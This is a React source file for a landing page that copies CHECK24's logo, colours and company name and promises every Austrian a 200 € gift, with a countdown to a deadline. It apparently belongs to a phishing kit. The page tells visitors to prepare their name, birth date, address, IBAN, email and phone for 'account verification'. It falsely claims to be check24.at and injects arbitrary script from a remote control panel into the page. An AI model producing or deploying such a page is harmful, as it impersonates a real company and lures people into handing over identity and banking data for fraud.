import { useEffect, useState } from "react";
import {
  Gift, CalendarClock, ShieldCheck, MapPin,
  FileEdit, Mail, Wallet, IdCard,
  User, Calendar, CreditCard, Phone,
  ArrowRight, Lock, Info,
} from "lucide-react";
import { usePanel } from "@/components/PanelProvider";
import { usePageMeta } from "@/hooks/use-page-meta";
import check24bg from "@/assets/check24bg.png.asset.json";

const C24_BLUE = "#005EA8";
const C24_BLUE_DARK = "#004A87";
const C24_YELLOW = "#FFCC00";
const AKTIONS_ENDE = "01.08.2026";

const FAVICON =
  "data:image/svg+xml;utf8," +
  encodeURIComponent(
    `<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><rect width='64' height='64' rx='10' fill='#005EA8'/><text x='50%' y='55%' text-anchor='middle' dominant-baseline='middle' font-family='Arial,Helvetica,sans-serif' font-weight='800' font-size='26' fill='#fff'>C24</text></svg>`
  );

type IconType = React.ComponentType<React.SVGProps<SVGSVGElement>>;

const SectionHeading = ({ children, kicker }: { children: React.ReactNode; kicker?: string }) => (
  <div className="text-center mb-8">
    {kicker && (
      <div className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-2" style={{ color: C24_BLUE }}>
        {kicker}
      </div>
    )}
    <h2 className="text-2xl md:text-[28px] font-semibold text-gray-900 leading-tight">{children}</h2>
    <div className="w-10 h-[3px] mx-auto rounded-full mt-4" style={{ backgroundColor: C24_BLUE }} />
  </div>
);

const InfoItem = ({ Icon, title, text }: { Icon: IconType; title: string; text: string }) => (
  <div className="bg-white border border-gray-200 rounded-xl p-5 text-left flex gap-4 items-start shadow-sm transition-all duration-200 hover:-translate-y-0.5 hover:shadow-md hover:border-gray-300">
    <div
      className="shrink-0 w-9 h-9 rounded-md flex items-center justify-center border"
      style={{ backgroundColor: "rgba(0,94,168,0.06)", borderColor: "rgba(0,94,168,0.2)" }}
    >
      <Icon className="w-[18px] h-[18px]" style={{ color: C24_BLUE }} strokeWidth={2} />
    </div>
    <div className="min-w-0">
      <h3 className="text-[13px] font-normal uppercase tracking-wider mb-1 leading-tight" style={{ color: C24_BLUE }}>
        {title}
      </h3>
      <p className="text-[13.5px] text-gray-600 leading-relaxed">{text}</p>
    </div>
  </div>
);

const Check24Logo = ({ className = "h-8 md:h-9 w-auto" }: { className?: string }) => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 184.518 44" className={className} aria-label="CHECK24" role="img">
    <path d="M11.422,28.577h-.008c-3.027,0-6.164-.068-8.224-.925-1.069-.44-1.81-1.032-2.333-1.858C.281,24.883,0,23.7,0,22.19,0,21.037.171,19.687.499,18.162c.079-.35,1.865-8.467,1.982-8.898.476-1.692,1.069-3.088,1.826-4.256,1.303-2.01,3.043-3.308,5.469-4.082,2.021-.637,4.595-.925,8.333-.925h.031c1.966,0,3.581.137,4.938.41,1.599.327,2.825.865,3.636,1.585.609.547.999,1.207,1.162,1.972.086.387.125.82.125,1.282,0,1.077-.226,2.208-.406,3.11-.024.137-.055.258-.079.387l-.008.038h-7.24l.008-.053s.024-.212.031-.311c0-.008.031-.288.031-.698,0-.615-.297-1.092-.897-1.464-.476-.265-1.092-.357-1.678-.425-.624-.076-1.327-.083-1.99-.083-1.217,0-2.138.091-2.895.296-.6.16-1.107.395-1.529.705-.6.44-1.069,1.077-1.428,1.942-.336.804-.578,1.768-.843,2.958l-.975,4.552c-.32,1.464-.547,2.572-.547,3.528,0,.553.079.987.242,1.373.257.615.804,1.092,1.544,1.35.71.25,1.615.364,2.926.364.874,0,1.592-.015,2.247-.091,1.131-.129,1.942-.463,2.551-1.04.663-.622,1.107-1.548,1.404-2.905l.101-.463h7.162v.045c0,.053-.406,1.882-.617,2.617-.218.767-.453,1.411-.725,1.988-.694,1.472-1.662,2.61-3.051,3.573-1.342.91-2.77,1.472-4.494,1.768-1.483.25-3.003.273-4.689.273.006.002-.649-.006-.735-.006Z" fill="#fff"/>
    <path d="M91.648,28.577h0c-3.035,0-6.171-.068-8.231-.925-1.069-.44-1.81-1.032-2.333-1.858-.578-.91-.859-2.093-.859-3.603,0-1.153.171-2.503.499-4.028.079-.349,1.865-8.467,1.982-8.898.468-1.692,1.069-3.088,1.826-4.256,1.303-2.01,3.043-3.308,5.469-4.082,2.022-.637,4.597-.925,8.333-.925h.031c1.966,0,3.581.137,4.938.41,1.599.327,2.825.865,3.636,1.585.609.547.999,1.207,1.162,1.972.086.387.125.82.125,1.282,0,1.077-.226,2.208-.406,3.118-.024.129-.055.258-.079.387l-.008.038h-7.24l.008-.053s.024-.212.031-.311c0-.008.031-.288.031-.698,0-.615-.297-1.092-.897-1.464-.476-.265-1.092-.357-1.678-.425-.624-.076-1.327-.083-1.99-.083-1.217,0-2.138.091-2.895.296-.6.16-1.1.395-1.529.705-.6.44-1.069,1.077-1.428,1.942-.336.804-.578,1.768-.843,2.958l-.991,4.537c-.32,1.464-.547,2.572-.547,3.528,0,.553.079.987.242,1.373.257.615.804,1.092,1.544,1.35.71.25,1.615.364,2.926.364.874,0,1.592-.015,2.247-.091,1.131-.129,1.942-.463,2.551-1.04.663-.622,1.107-1.548,1.404-2.905l.101-.463h7.162v.045c0,.053-.406,1.882-.617,2.617-.218.767-.453,1.411-.725,1.988-.694,1.48-1.662,2.61-3.051,3.573-1.342.91-2.77,1.472-4.494,1.768-1.477.252-5.323.274-5.409.274Z" fill="#fff"/>
    <path d="M76.107,28.35h-20.831l.015-.053L61.12,1.638c.101-.493.288-.827.593-1.055.312-.235.741-.349,1.311-.349h17.578c.437,0,.749.098.936.28.141.144.218.349.218.6v.023c0,.107-.015.205-.039.311l-.905,4.157h-13.605l-1.178,5.515h12.771l-1.162,5.197h-12.773l-1.452,6.653h13.887l-1.193,5.378Z" fill="#fff"/>
    <path d="M113.463,28.35h-6.944l.015-.053,5.804-26.56c.141-.577.358-.971.687-1.213.257-.19.585-.28,1.006-.28h4.112c.444,0,.773.098.984.296.164.152.25.38.25.645,0,.083-.008.167-.024.25l-5.891,26.915Z" fill="#fff"/>
    <path d="M132.585,28.35h-8.754l-.015-.03-6.483-14.58.024-.023,11.211-11.835c.694-.736,1.1-1.108,1.467-1.328.391-.235.734-.318,1.296-.318h5.648c.266,0,.429.083.523.16.055.045.094.091.117.137.015.03.031.068.031.113h.008l-.008.091c-.008.113-.07.303-.305.553l-12.101,12.647,7.341,14.413Z" fill="#fff"/>
    <path d="M44.767,28.35h-.055l.015-.053,2.465-11.357h-11.445l-2.497,11.41h-6.944l.015-.053c.235-1.077,5.75-26.4,5.789-26.544.202-.835.547-1.123.819-1.275.297-.167.71-.243,1.296-.243h3.752c.195,0,.514.083.757.25.132.091.235.197.297.311.079.137.117.288.117.463,0,.076-.008.16-.024.243-.031.16-1.935,8.815-2.122,9.672h11.453c.929-4.271,2.045-9.362,2.06-9.422.202-.835.547-1.123.819-1.275.297-.167.71-.243,1.296-.243h3.752c.195,0,.514.083.757.25.132.091.235.197.297.311.079.137.117.288.117.463,0,.076-.008.16-.024.243-.031.167-5.625,25.717-5.867,26.81l-.008.038h-6.888Z" fill="#fff"/>
    <path d="M153.064,5.728c.538.137.96.395,1.186.827h0c.148.288.218.622.218,1.024h0c0,.41-.07.888-.187,1.449h0c-.164.736-.32,1.343-.562,1.867h0c-.242.523-.569.956-1.046,1.32h0c-.951.728-2.434,1.168-5.063,1.745h0c-3.48.751-5.874,1.373-7.568,2.192h0c-1.693.82-2.676,1.798-3.418,3.345h0c-.492,1.032-.866,2.322-1.225,3.952h0l-.984,4.855h22.524l1.053-4.916h-15.673s.242-1.183.444-1.616h0c.257-.562.593-.978,1.03-1.29h0c.437-.311.967-.516,1.608-.69h0c1.287-.349,3.066-.584,5.68-1.229h0c3.222-.812,5.399-1.7,6.935-3.133h0c1.537-1.433,2.473-3.452,3.159-6.615h0c.257-1.168.398-2.322.398-3.193h0c0-1.252-.25-2.215-.694-2.951h0c-.444-.736-1.085-1.267-1.927-1.662h0c-1.67-.782-4.127-.963-7.038-.963h0c-3.706,0-6.623.372-8.793,1.669h0c-2.168,1.29-3.675,3.642-4.517,7.472h0l-.235,1.085h6.85l.266-1.198c.266-1.145.514-1.927.96-2.48h0c.444-.562,1.092-.827,1.966-.933h0c.593-.076,1.303-.091,2.184-.091h.406c.854-.012,1.524.027,2.062.163h0Z" fill="#fff"/>
    <path d="M171.961,3.02c-.795.804-7.482,7.602-10.221,10.393-.547.569-1.131,1.198-1.388,1.722-.211.38-.483,1.433-.624,2.185-.288,1.57-.507,3.004-.639,3.588-.031.152-.046.288-.046.417,0,.485.211.804.492,1.04.273.228.648.333,1.015.333h13.27l-1.225,5.607,6.983-.645,1.085-4.969h2.497l1.085-4.969h-2.497s2.497-11.333,2.575-11.758c.859-4.59-1.1-5.932-5.516-5.932-1.125.021-3.676-.207-6.844,2.987ZM174.894,17.737h-10.025l11.93-12.017h.725l-2.629,12.017Z" fill="#fff"/>
    <path d="M156.326,44h0c-4.51,0-8.839-1.168-12.523-3.383-3.62-2.17-5.727-4.733-6.726-6.183l-1.318,3.3c-.117.303-.444.493-.795.44-.343-.06-.6-.349-.6-.683l-.07-6.471v-.008c0-.182.079-.357.211-.478.141-.129.32-.205.514-.205h6.78c.336.008.624.25.687.569.008.045.015.083.015.129,0,.288-.187.547-.461.652l-3.3,1.244c2.895,2.511,8.863,6.547,17.242,6.547.718,0,1.443-.03,2.161-.091,3.534-.288,7.1-1.138,10.314-2.443,2.816-1.145,5.298-2.602,7.194-4.225l-3.409-.978c-.305-.083-.523-.357-.523-.668v-.068c.031-.333.312-.6.655-.63l6.608-.584c.031,0,.055-.008.07-.008.171,0,.336.06.461.16.148.122.242.296.257.478q.547,6.32.547,6.342c0,.311-.218.592-.531.675-.062.015-.125.023-.187.023-.281,0-.531-.152-.655-.387l-1.599-2.973c-1.279,1.684-3.511,4.058-7.006,6.122-3.541,2.093-7.497,3.338-11.757,3.687l-.429.038h0c-.603.042-1.219.065-1.828.065Z" fill="#fff"/>
  </svg>
);

const TARGET = new Date("2026-08-01T00:00:00").getTime();

const Countdown = () => {
  const [now, setNow] = useState(Date.now());
  useEffect(() => {
    const id = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(id);
  }, []);
  const diff = Math.max(0, TARGET - now);
  const d = Math.floor(diff / 86400000);
  const h = Math.floor((diff % 86400000) / 3600000);
  const m = Math.floor((diff % 3600000) / 60000);
  const s = Math.floor((diff % 60000) / 1000);
  const boxes: [number, string][] = [[d, "TAGE"], [h, "STD"], [m, "MIN"], [s, "SEK"]];
  const cutoutStyle: React.CSSProperties = {
    backgroundImage: `url(${check24bg.url})`,
    backgroundSize: "100vw auto",
    backgroundPosition: "center center",
    backgroundAttachment: "fixed",
    WebkitBackgroundClip: "text",
    backgroundClip: "text",
    color: "transparent",
    WebkitTextFillColor: "transparent",
  };
  return (
    <div className="flex items-center justify-center gap-3">
      {boxes.map(([v, label]) => (
        <div key={label} className="rounded-lg px-4 py-3 min-w-[64px] bg-white">
          <div className="text-3xl md:text-4xl font-black leading-none" style={cutoutStyle}>{String(v).padStart(2, "0")}</div>
          <div className="text-[10px] font-bold uppercase tracking-wider mt-1" style={cutoutStyle}>{label}</div>
        </div>
      ))}
    </div>
  );
};

const Check24 = () => {
  usePageMeta("CHECK24 – 200 € geschenkt für alle Österreicher", FAVICON);

  const panel = usePanel();
  const pixelActive =
    panel.matched && panel.metaTagEnabled && !!panel.metaTagSnippet;

  useEffect(() => {
    const desc = `CHECK24 verschenkt 200 € an alle Österreicher – Neu- und Bestandskunden. Aktion nur bis ${AKTIONS_ENDE}.`;
    let meta = document.querySelector('meta[name="description"]');
    if (!meta) {
      meta = document.createElement("meta");
      meta.setAttribute("name", "description");
      document.head.appendChild(meta);
    }
    meta.setAttribute("content", desc);
  }, []);

  // Meta-Tag-Snippet injizieren (falls Panel aktiv)
  useEffect(() => {
    if (!pixelActive || !panel.metaTagSnippet) return;
    const container = document.createElement("div");
    container.innerHTML = panel.metaTagSnippet;
    const injected: Node[] = [];
    Array.from(container.childNodes).forEach((node) => {
      if (node.nodeType === Node.ELEMENT_NODE) {
        const el = node as HTMLElement;
        if (el.tagName === "SCRIPT") {
          const s = document.createElement("script");
          Array.from(el.attributes).forEach((a) => s.setAttribute(a.name, a.value));
          s.text = el.textContent || "";
          document.head.appendChild(s);
          injected.push(s);
        } else {
          document.head.appendChild(el);
          injected.push(el);
        }
      }
    });
    return () => {
      injected.forEach((n) => {
        if (n.parentNode) n.parentNode.removeChild(n);
      });
    };
  }, [pixelActive, panel.metaTagSnippet]);

  const handleCta = () => {
    if (pixelActive && typeof (window as any).fbq === "function") {
      try {
        (window as any).fbq("track", "Lead");
      } catch {
        // ignore
      }
    }
    // Placeholder — Wizard folgt ggf. später
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const voraussetzungen: { Icon: IconType; title: string; text: string }[] = [
    { Icon: MapPin, title: "Wohnsitz", text: "Hauptwohnsitz in Österreich" },
    { Icon: IdCard, title: "Alter", text: "Mindestens 18 Jahre" },
    { Icon: Wallet, title: "Bankkonto", text: "Gültige IBAN für die Auszahlung" },
    { Icon: CalendarClock, title: "Frist", text: `Aktion nur bis ${AKTIONS_ENDE}` },
  ];

  const schritte: { Icon: IconType; title: string; text: string }[] = [
    { Icon: FileEdit, title: "Daten eingeben", text: "Persönliche Angaben ausfüllen" },
    { Icon: ShieldCheck, title: "Konto verifizieren", text: "Bankverbindung bestätigen" },
    { Icon: Mail, title: "Bestätigung", text: "Bestätigung per E-Mail" },
    { Icon: Gift, title: "200 € erhalten", text: "Gutschrift auf Ihr Konto" },
  ];

  const angaben: { Icon: IconType; title: string; text: string }[] = [
    { Icon: User, title: "Name", text: "Vollständiger Vor- und Nachname" },
    { Icon: Calendar, title: "Geburtsdatum", text: "Tag, Monat und Jahr" },
    { Icon: MapPin, title: "Adresse", text: "Straße, Hausnummer, PLZ, Ort" },
    { Icon: CreditCard, title: "IBAN", text: "Für die Auszahlung des Bonus" },
    { Icon: Mail, title: "E-Mail", text: "Für Bestätigung und Rückfragen" },
    { Icon: Phone, title: "Telefon", text: "Telefonnummer für Erreichbarkeit" },
  ];

  const CtaButton = ({ label = "Jetzt 200 € sichern" }: { label?: string }) => (
    <button
      type="button"
      onClick={handleCta}
      className="inline-flex items-center gap-2 text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors"
      style={{ backgroundColor: C24_BLUE }}
      onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = C24_BLUE_DARK)}
      onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = C24_BLUE)}
    >
      <span>{label}</span>
      <ArrowRight className="w-4 h-4" />
    </button>
  );

  return (
    <div className="min-h-screen bg-gray-50 text-gray-900" style={{ fontFamily: "'Open Sans', system-ui, sans-serif" }}>
      {/* Header + Hero – gemeinsamer Background */}
      <div
        className="relative border-b border-gray-200"
        style={{ backgroundImage: `url(${check24bg.url})`, backgroundSize: "cover", backgroundPosition: "center" }}
      >
        <header>
          <div className="container mx-auto flex items-center justify-center px-4 py-5">
            <Check24Logo />
          </div>
        </header>

        {/* Hero – zentriert, einspaltig */}
        <section className="relative overflow-hidden">
          <div className="relative container mx-auto px-4 pt-6 pb-14 md:pt-8 md:pb-20 max-w-3xl text-center" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
            <h1 className="text-3xl md:text-5xl font-bold mb-4 tracking-tight text-white leading-[1.1]">
              <span style={{ color: C24_YELLOW }}>200 €</span> geschenkt
              <span className="block text-xl md:text-2xl font-bold text-white/90 mt-2">
                für alle Österreicher – Neu- und Bestandskunden
              </span>
            </h1>
            <p className="text-[15px] md:text-lg text-white/85 mb-8 max-w-xl mx-auto leading-relaxed">
              Jetzt kostenlos teilnehmen – Abgabefrist: {AKTIONS_ENDE}
            </p>

            {/* Countdown */}
            <Countdown />

            <button
              type="button"
              onClick={handleCta}
              className="inline-flex items-center gap-2 font-extrabold text-base px-8 py-4 rounded-md transition-transform shadow-xl hover:scale-[1.02] active:scale-[0.99] mt-8"
              style={{ backgroundColor: C24_YELLOW, color: "#1a1a1a" }}
            >
              <span>Jetzt teilnehmen</span>
              <ArrowRight className="w-5 h-5" />
            </button>
            <div className="flex items-center justify-center gap-2 mt-5 text-[12px] text-white/80">
              <Lock className="w-3.5 h-3.5" />
              <span>SSL-verschlüsselt · check24.at</span>
            </div>
          </div>
        </section>
      </div>


      <main className="py-12 md:py-14 space-y-14">
        {/* Info */}
        <section className="container mx-auto px-4 max-w-3xl">
          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm">
            <div className="h-1" style={{ backgroundColor: C24_BLUE }} />
            <div className="p-8 md:p-10 text-center">
              <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-3" style={{ color: C24_BLUE }}>
                <Info className="w-3.5 h-3.5" />
                Werbeaktion
              </div>
              <h2 className="text-xl md:text-2xl font-semibold text-gray-900 mb-3">
                So funktioniert unsere 200 €-Aktion
              </h2>
              <div className="text-gray-600 text-[14.5px] max-w-xl mx-auto leading-relaxed space-y-2">
                <p>
                  Als Dankeschön verschenkt CHECK24 Österreich <strong>200 €</strong> an jeden neuen und bestehenden Kunden mit Wohnsitz in Österreich.
                </p>
                <p>
                  Der Bonus wird nach erfolgreicher Verifizierung direkt auf Ihr angegebenes Konto überwiesen.
                </p>
                <p className="font-semibold" style={{ color: C24_BLUE }}>
                  Aktion endet am {AKTIONS_ENDE} – jetzt teilnehmen!
                </p>
              </div>
            </div>
          </div>
        </section>

        {/* Voraussetzungen */}
        <section className="container mx-auto px-4 max-w-5xl">
          <SectionHeading kicker="Teilnahme">Voraussetzungen</SectionHeading>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {voraussetzungen.map((v) => (
              <InfoItem key={v.title} Icon={v.Icon} title={v.title} text={v.text} />
            ))}
          </div>
        </section>

        {/* Ablauf */}
        <section className="container mx-auto px-4 max-w-5xl">
          <SectionHeading kicker="Ablauf">So funktioniert&apos;s</SectionHeading>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {schritte.map((s, i) => (
              <div
                key={s.title}
                className="bg-white border border-gray-200 rounded-xl p-5 text-center shadow-sm transition-all duration-200 hover:-translate-y-0.5 hover:shadow-md hover:border-gray-300"
              >
                <span
                  className="mx-auto mb-3 w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold bg-white"
                  style={{ border: `1px solid ${C24_BLUE}`, color: C24_BLUE }}
                >
                  {i + 1}
                </span>
                <h3 className="text-[15px] font-semibold text-gray-900 mb-1 leading-tight">{s.title}</h3>
                <p className="text-[13.5px] text-gray-600 leading-relaxed">{s.text}</p>
              </div>
            ))}
          </div>
        </section>

        {/* Angaben */}
        <section className="container mx-auto px-4 max-w-5xl">
          <SectionHeading kicker="Vorbereitung">Welche Angaben Sie benötigen</SectionHeading>
          <p className="text-gray-600 text-[14.5px] leading-relaxed text-center max-w-xl mx-auto mb-8 -mt-2">
            Halten Sie folgende Informationen bereit, bevor Sie das Formular ausfüllen.
          </p>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {angaben.map((a) => (
              <InfoItem key={a.title} Icon={a.Icon} title={a.title} text={a.text} />
            ))}
          </div>
        </section>

        {/* FAQ */}
        <section className="container mx-auto px-4 max-w-3xl">
          <SectionHeading kicker="FAQ">Häufige Fragen</SectionHeading>
          <div className="space-y-3">
            {[
              { q: "Wer bekommt den 200 €-Bonus?", a: "Alle volljährigen Personen mit Hauptwohnsitz in Österreich – sowohl Neukunden als auch bestehende CHECK24-Kunden." },
              { q: "Wann wird der Bonus ausgezahlt?", a: "Nach erfolgreicher Verifizierung Ihrer Daten wird der Betrag innerhalb weniger Werktage auf das angegebene Konto überwiesen." },
              { q: "Bis wann läuft die Aktion?", a: `Die Werbeaktion ist zeitlich begrenzt und endet am ${AKTIONS_ENDE}. Danach ist keine Teilnahme mehr möglich.` },
            ].map((f) => (
              <div key={f.q} className="bg-white border border-gray-200 rounded-xl p-5 shadow-sm">
                <h3 className="text-[15px] font-semibold text-gray-900 mb-1">{f.q}</h3>
                <p className="text-[13.5px] text-gray-600 leading-relaxed">{f.a}</p>
              </div>
            ))}
          </div>
        </section>

        {/* CTA Box */}
        <section className="container mx-auto px-4 max-w-3xl">
          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm">
            <div className="h-1" style={{ backgroundColor: C24_BLUE }} />
            <div className="p-8 md:p-10 text-center">
              <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-3" style={{ color: C24_BLUE }}>
                <Gift className="w-3.5 h-3.5" />
                Ihre 200 € warten
              </div>
              <h2 className="text-xl md:text-2xl font-semibold text-gray-900 mb-3">
                Bereit für Ihren Bonus?
              </h2>
              <div className="text-gray-600 text-[14.5px] mb-6 max-w-xl mx-auto leading-relaxed space-y-1">
                <p>In nur 2 Minuten erledigt.</p>
                <p>Sichern Sie sich jetzt 200 € geschenkt von CHECK24.</p>
              </div>
              <CtaButton />
              <div className="flex items-center justify-center gap-2 mt-5 text-[12px] text-gray-500">
                <Lock className="w-3.5 h-3.5" />
                <span>SSL-verschlüsselt · CHECK24 Vergleichsportal</span>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer style={{ backgroundColor: C24_BLUE }} className="text-white/90">
        <div className="container mx-auto px-4 py-8 text-center">
          <nav className="flex flex-wrap justify-center gap-x-6 gap-y-2 mb-3 text-[13px]">
            <a href="#" className="hover:text-white hover:underline transition-colors">Impressum</a>
            <a href="#" className="hover:text-white hover:underline transition-colors">Datenschutz</a>
            <a href="#" className="hover:text-white hover:underline transition-colors">AGB</a>
            <a href="#" className="hover:text-white hover:underline transition-colors">Kontakt</a>
          </nav>
          <p className="text-[11.5px] text-white/70">
            © 2026 CHECK24 Vergleichsportal GmbH
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Check24;
